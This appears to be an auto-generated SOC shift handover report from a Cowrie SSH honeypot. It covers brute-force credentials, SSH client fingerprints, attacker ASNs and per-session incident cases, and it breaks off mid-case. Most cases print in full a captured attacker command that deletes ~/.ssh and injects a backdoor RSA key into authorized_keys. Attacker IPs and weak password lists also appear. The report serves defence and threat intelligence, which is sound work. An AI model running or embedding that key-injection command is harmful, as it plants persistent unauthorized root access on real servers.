# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-02 |
| **Generated At** | 2026-05-02T09:12:15Z |
| **Shift Time** | 09:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **3781** |
| Confirmed Threats | **3565** |
| False Positives Filtered | **216** (5.7%) |
| Unique Attacker IPs | **46** |
| Countries of Origin | **20** |
| High Severity Cases | **66** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **3715** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **215** |
| Unique Credential Pairs | **119** |
| Unique Usernames | **43** |
| Unique Passwords | **113** |
| Successful Auth Pairs | **43** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 66 |
| `345gs5662d34` | 31 |
| `ubuntu` | 24 |
| `admin` | 17 |
| `test` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 32 |
| `345gs5662d34` | 31 |
| `123456` | 7 |
| `test` | 4 |
| `1qaz@WSX` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 32 |
| `345gs5662d34` | `345gs5662d34` | 31 |
| `svnadmin` | `123456` | 2 |
| `hldmserver` | `123456` | 2 |
| `postgres` | `pass1234` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `server@2024` | `189.50.142.78` | 2026-05-02T06:20:43 |
| `root` | `3245gs5662d34` | `189.50.142.78` | 2026-05-02T06:20:51 |
| `root` | `test_123` | `189.50.142.78` | 2026-05-02T06:24:41 |
| `root` | `testadmin` | `189.50.142.78` | 2026-05-02T06:44:27 |
| `root` | `testman` | `45.78.202.217` | 2026-05-02T06:44:44 |
| `root` | `3245gs5662d34` | `45.78.202.217` | 2026-05-02T06:44:53 |
| `root` | `testin` | `189.50.142.78` | 2026-05-02T06:48:23 |
| `root` | `test@123` | `45.78.202.217` | 2026-05-02T07:07:40 |
| `root` | `testadmin` | `45.78.202.217` | 2026-05-02T07:09:26 |
| `root` | `!QAZ1qaz123` | `139.59.112.10` | 2026-05-02T07:35:44 |
| `root` | `3245gs5662d34` | `139.59.112.10` | 2026-05-02T07:35:46 |
| `root` | `Zj123456@` | `139.59.112.10` | 2026-05-02T07:39:32 |
| `root` | `Qwerty123$` | `139.59.112.10` | 2026-05-02T07:43:32 |
| `root` | `123456Ai` | `139.59.112.10` | 2026-05-02T07:44:28 |
| `root` | `Founder@2024` | `139.59.112.10` | 2026-05-02T07:46:25 |
| `root` | `Micro@123` | `139.59.112.10` | 2026-05-02T07:47:27 |
| `root` | `Aa147258369` | `139.59.112.10` | 2026-05-02T07:48:28 |
| `root` | `sas123` | `139.59.112.10` | 2026-05-02T07:49:28 |
| `root` | `123@admin` | `115.151.72.122` | 2026-05-02T07:50:07 |
| `root` | `3245gs5662d34` | `115.151.72.122` | 2026-05-02T07:50:14 |
| `root` | `Ll123456!` | `139.59.112.10` | 2026-05-02T07:51:30 |
| `root` | `---fuck_you----` | `180.76.143.27` | 2026-05-02T07:52:29 |
| `root` | `mehmet123` | `139.59.112.10` | 2026-05-02T07:53:27 |
| `root` | `iflytek` | `139.59.112.10` | 2026-05-02T07:54:25 |
| `root` | `qwe@123!` | `139.59.112.10` | 2026-05-02T07:55:29 |
| `root` | `qaz123456.` | `139.59.112.10` | 2026-05-02T07:56:28 |
| `root` | `qwqw12` | `139.59.112.10` | 2026-05-02T07:57:27 |
| `root` | `admin@1234567` | `42.96.17.249` | 2026-05-02T07:58:59 |
| `root` | `3245gs5662d34` | `42.96.17.249` | 2026-05-02T07:59:02 |
| `root` | `newpass` | `139.59.112.10` | 2026-05-02T08:00:31 |
| `root` | `1234567890a` | `139.59.112.10` | 2026-05-02T08:01:32 |
| `root` | `vps12` | `42.96.17.249` | 2026-05-02T08:07:21 |
| `root` | `test123456` | `118.33.113.91` | 2026-05-02T08:21:30 |
| `root` | `3245gs5662d34` | `118.33.113.91` | 2026-05-02T08:21:34 |
| `root` | `admin@1234567` | `186.13.24.118` | 2026-05-02T08:29:00 |
| `root` | `3245gs5662d34` | `186.13.24.118` | 2026-05-02T08:29:08 |
| `root` | `vps12` | `186.13.24.118` | 2026-05-02T08:37:48 |
| `root` | `qazxsw321` | `68.183.236.1` | 2026-05-02T08:43:16 |
| `root` | `3245gs5662d34` | `68.183.236.1` | 2026-05-02T08:43:18 |
| `root` | `------fuck------` | `123.182.141.59` | 2026-05-02T08:45:26 |
| `root` | `admin32` | `103.76.120.81` | 2026-05-02T08:56:34 |
| `root` | `3245gs5662d34` | `103.76.120.81` | 2026-05-02T08:56:40 |
| `root` | `windowsserver` | `103.76.120.81` | 2026-05-02T08:59:18 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **3781** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 237 |
| Go SSH scanner | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 151 | 6 |
| `03a80b21afa8...` | Modern SSH client | 86 | 3 |
| `98f63c4d9c87...` | Generic scanner | 2 | 2 |
| `4e066189c3bb...` | Generic scanner | 1 | 1 |
| `dde267e50f82...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 151 | 6 | libssh-based |
| `03a80b21afa8...` | libssh | 86 | 3 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `4e066189c3bb...` | Unknown | 1 | 1 | Generic scanner |
| `dde267e50f82...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 31 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `42.96.17.249`, `68.183.236.1`, `189.50.142.78`, `115.151.72.122`, `45.78.202.217`, `118.33.113.91`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **46** |
| Unique ASNs | **37** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS55836` | Reliance Jio Infocomm Limited | 3 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS396982` | Google LLC | 1 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | MEDIUM |
| `AS51167` | Contabo GmbH | 1 | MEDIUM |
| `AS28330` | IFTNET-TELECOM | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (66)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-aafd3804a334

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-05-02 06:20 |
| **Last Seen** | 2026-05-02 06:20 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 06:20:40` | `cowrie.session.connect` |
| `2026-05-02 06:20:40` | `cowrie.client.version` |
| `2026-05-02 06:20:41` | `cowrie.client.kex` |
| `2026-05-02 06:20:43` | `cowrie.login.success` |
| `2026-05-02 06:20:43` | `cowrie.session.params` |
| `2026-05-02 06:20:43` | `cowrie.command.input` |
| `2026-05-02 06:20:43` | `cowrie.command.failed` |
| `2026-05-02 06:20:44` | `cowrie.log.closed` |
| `2026-05-02 06:20:45` | `cowrie.session.params` |
| `2026-05-02 06:20:45` | `cowrie.command.input` |
| `2026-05-02 06:20:45` | `cowrie.session.file_download` |
| `2026-05-02 06:20:45` | `cowrie.log.closed` |
| `2026-05-02 06:20:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22432f521cc5

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-05-02 06:20 |
| **Last Seen** | 2026-05-02 06:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 06:20:49` | `cowrie.session.connect` |
| `2026-05-02 06:20:49` | `cowrie.client.version` |
| `2026-05-02 06:20:50` | `cowrie.client.kex` |
| `2026-05-02 06:20:51` | `cowrie.login.success` |
| `2026-05-02 06:20:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08079b01925e

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-05-02 06:24 |
| **Last Seen** | 2026-05-02 06:24 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 06:24:39` | `cowrie.session.connect` |
| `2026-05-02 06:24:39` | `cowrie.client.version` |
| `2026-05-02 06:24:39` | `cowrie.client.kex` |
| `2026-05-02 06:24:41` | `cowrie.login.success` |
| `2026-05-02 06:24:42` | `cowrie.session.params` |
| `2026-05-02 06:24:42` | `cowrie.command.input` |
| `2026-05-02 06:24:42` | `cowrie.command.failed` |
| `2026-05-02 06:24:42` | `cowrie.log.closed` |
| `2026-05-02 06:24:43` | `cowrie.session.params` |
| `2026-05-02 06:24:43` | `cowrie.command.input` |
| `2026-05-02 06:24:43` | `cowrie.session.file_download` |
| `2026-05-02 06:24:43` | `cowrie.log.closed` |
| `2026-05-02 06:24:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8b171f5f550

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-05-02 06:24 |
| **Last Seen** | 2026-05-02 06:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 06:24:48` | `cowrie.session.connect` |
| `2026-05-02 06:24:48` | `cowrie.client.version` |
| `2026-05-02 06:24:48` | `cowrie.client.kex` |
| `2026-05-02 06:24:50` | `cowrie.login.success` |
| `2026-05-02 06:24:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bba2f4e24c0

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-05-02 06:44 |
| **Last Seen** | 2026-05-02 06:44 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 06:44:25` | `cowrie.session.connect` |
| `2026-05-02 06:44:25` | `cowrie.client.version` |
| `2026-05-02 06:44:25` | `cowrie.client.kex` |
| `2026-05-02 06:44:27` | `cowrie.login.success` |
| `2026-05-02 06:44:28` | `cowrie.session.params` |
| `2026-05-02 06:44:28` | `cowrie.command.input` |
| `2026-05-02 06:44:28` | `cowrie.command.failed` |
| `2026-05-02 06:44:28` | `cowrie.log.closed` |
| `2026-05-02 06:44:29` | `cowrie.session.params` |
| `2026-05-02 06:44:29` | `cowrie.command.input` |
| `2026-05-02 06:44:29` | `cowrie.session.file_download` |
| `2026-05-02 06:44:29` | `cowrie.log.closed` |
| `2026-05-02 06:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-120735687540

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-05-02 06:44 |
| **Last Seen** | 2026-05-02 06:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 06:44:34` | `cowrie.session.connect` |
| `2026-05-02 06:44:34` | `cowrie.client.version` |
| `2026-05-02 06:44:34` | `cowrie.client.kex` |
| `2026-05-02 06:44:36` | `cowrie.login.success` |
| `2026-05-02 06:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4a036c791f6

| Field | Detail |
|---|---|
| **Source IP** | `45.78.202[.]217` |
| **First Seen** | 2026-05-02 06:44 |
| **Last Seen** | 2026-05-02 06:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 06:44:42` | `cowrie.session.connect` |
| `2026-05-02 06:44:42` | `cowrie.client.version` |
| `2026-05-02 06:44:42` | `cowrie.client.kex` |
| `2026-05-02 06:44:44` | `cowrie.login.success` |
| `2026-05-02 06:44:45` | `cowrie.session.params` |
| `2026-05-02 06:44:45` | `cowrie.command.input` |
| `2026-05-02 06:44:45` | `cowrie.command.failed` |
| `2026-05-02 06:44:46` | `cowrie.log.closed` |
| `2026-05-02 06:44:47` | `cowrie.session.params` |
| `2026-05-02 06:44:47` | `cowrie.command.input` |
| `2026-05-02 06:44:47` | `cowrie.session.file_download` |
| `2026-05-02 06:44:47` | `cowrie.log.closed` |
| `2026-05-02 06:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.202[.]217` to AbuseIPDB if not already reported
- [ ] Block `45.78.202[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63e1a057c458

| Field | Detail |
|---|---|
| **Source IP** | `45.78.202[.]217` |
| **First Seen** | 2026-05-02 06:44 |
| **Last Seen** | 2026-05-02 06:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 06:44:50` | `cowrie.session.connect` |
| `2026-05-02 06:44:50` | `cowrie.client.version` |
| `2026-05-02 06:44:50` | `cowrie.client.kex` |
| `2026-05-02 06:44:53` | `cowrie.login.success` |
| `2026-05-02 06:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.202[.]217` to AbuseIPDB if not already reported
- [ ] Block `45.78.202[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75697dad27a2

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-05-02 06:48 |
| **Last Seen** | 2026-05-02 06:48 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 06:48:21` | `cowrie.session.connect` |
| `2026-05-02 06:48:21` | `cowrie.client.version` |
| `2026-05-02 06:48:22` | `cowrie.client.kex` |
| `2026-05-02 06:48:23` | `cowrie.login.success` |
| `2026-05-02 06:48:24` | `cowrie.session.params` |
| `2026-05-02 06:48:24` | `cowrie.command.input` |
| `2026-05-02 06:48:24` | `cowrie.command.failed` |
| `2026-05-02 06:48:24` | `cowrie.log.closed` |
| `2026-05-02 06:48:25` | `cowrie.session.params` |
| `2026-05-02 06:48:25` | `cowrie.command.input` |
| `2026-05-02 06:48:26` | `cowrie.session.file_download` |
| `2026-05-02 06:48:26` | `cowrie.log.closed` |
| `2026-05-02 06:48:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93ac0f988d22

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-05-02 06:48 |
| **Last Seen** | 2026-05-02 06:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 06:48:30` | `cowrie.session.connect` |
| `2026-05-02 06:48:30` | `cowrie.client.version` |
| `2026-05-02 06:48:30` | `cowrie.client.kex` |
| `2026-05-02 06:48:32` | `cowrie.login.success` |
| `2026-05-02 06:48:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ddb02fcebad

| Field | Detail |
|---|---|
| **Source IP** | `45.78.202[.]217` |
| **First Seen** | 2026-05-02 07:07 |
| **Last Seen** | 2026-05-02 07:07 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:07:36` | `cowrie.session.connect` |
| `2026-05-02 07:07:36` | `cowrie.client.version` |
| `2026-05-02 07:07:38` | `cowrie.client.kex` |
| `2026-05-02 07:07:40` | `cowrie.login.success` |
| `2026-05-02 07:07:42` | `cowrie.session.params` |
| `2026-05-02 07:07:42` | `cowrie.command.input` |
| `2026-05-02 07:07:42` | `cowrie.command.failed` |
| `2026-05-02 07:07:54` | `cowrie.log.closed` |
| `2026-05-02 07:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.202[.]217` to AbuseIPDB if not already reported
- [ ] Block `45.78.202[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-625d4b0bf10a

| Field | Detail |
|---|---|
| **Source IP** | `45.78.202[.]217` |
| **First Seen** | 2026-05-02 07:07 |
| **Last Seen** | 2026-05-02 07:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:07:51` | `cowrie.session.connect` |
| `2026-05-02 07:07:51` | `cowrie.client.version` |
| `2026-05-02 07:07:52` | `cowrie.client.kex` |
| `2026-05-02 07:07:52` | `cowrie.login.success` |
| `2026-05-02 07:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.202[.]217` to AbuseIPDB if not already reported
- [ ] Block `45.78.202[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9883418e462f

| Field | Detail |
|---|---|
| **Source IP** | `45.78.202[.]217` |
| **First Seen** | 2026-05-02 07:09 |
| **Last Seen** | 2026-05-02 07:09 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
